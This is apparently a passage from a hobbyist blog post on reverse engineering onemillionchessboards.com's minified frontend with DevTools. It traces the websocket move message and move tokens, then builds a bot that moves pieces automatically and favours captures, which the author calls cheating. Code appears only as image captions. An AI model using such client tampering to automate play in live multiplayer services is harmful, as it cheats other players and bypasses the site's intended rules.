websocket itself piece is the piece we want to move toX is the x location we want to move to toY is the y location we want to move to moveType and moveToken are the only two interesting ones here since its uncertain what they mean. By doing a bit more digging, we can find references to MoveType around the application and see that it’s basically an integer value that can denote a normal move, a castle move or en passant move:\nonemillionchessboards.com MoveType constant By checking where the $1a465e5e0e1a643e$var$protoSendMove function is called, we can see what moveToken is generated from the getIncrMoveToken function:\nonemillionchessboards.com protoSendMove function call Going one step further, we can see that it’s basically a token that gets sent with our request and gets incremented on every move made:\nonemillionchessboards.com getIncrMoveToken function So now we know how to make moves via code directly.\nFrom here, I looked around and found a getMoveableSquares function that returns which squares you are allowed to move to but also which squares will end up capturing a piece which is really convenient since we can use that to prioritise our moves later on:\nonemillionchessboards.com getMoveableSquares function When looking at the Map returned by the getMoveableSquares function we can see the captured pieces:\nonemillionchessboards.com getMoveableSquares returned value With all that in mind we can make a function that moves a piece we selected to a nearby moveable square, prioritising squares that end up capturing an opponent’s piece:\nonemillionchessboards.com custom move piece code Note\nThis function could obviously be improved a lot more to make a more intelligent bot (eg. retrieve the full map and optimise moves based on that). Nevertheless, this is only an example to showcase what can be done by simply using built-in DevTools.\nmakeMove is a custom function which reuses the code from the message create function we found earlier:\nonemillionchessboards.com custom makeMove function Now that we have this, we just need to wrap the code in an interval so that it triggers often (while making sure we don’t trigger too much to overwhelm the server or have our moves dropped).\nIn the end, I decided to modify the $a2d3bef833187ce9$export$474cd6ee072cf5a4 function which is called when you select a chess piece as it already has all the handlers I need to make the bot work. It also allows means I don’t have to create a button or anything and can simply select any piece to start the bot.\nI added a startConquest function here:\nonemillionchessboards.com startConquest call inside `$a2d3bef833187ce9$export$474cd6ee072cf5a4` function The function is basically an “interval” version of the function described previously:\nonemillionchessboards.com custom startConquest function gws is a global variable which holds the websocket object that I populate during initialisation. Tried to get it dynamically using $parcel$interopDefault but since its a react minified file, scopes are protected by exports and what not and I couldnt make it work so resorted to using a global variable (not ideal but its also only a PoC so not a huge problem).","the-bot-in-action#The bot in action":"In the end the result is pretty cool, I can just select any piece and they will start zooming around randomly, eating as many of the opposing pieces as possible.\n@itseieio I'm cheating harder than Hans Niemann over here... When VAC ban? https://t.co/3Nqmk6jCJw pic.twitter.com/0DuIxg5XRi\n— fyx (@_fyxme) May 4, 2025 "},"title":"Reverse Engineering onemillionchessboards.com Frontend with DevTools to Build a Bot"}}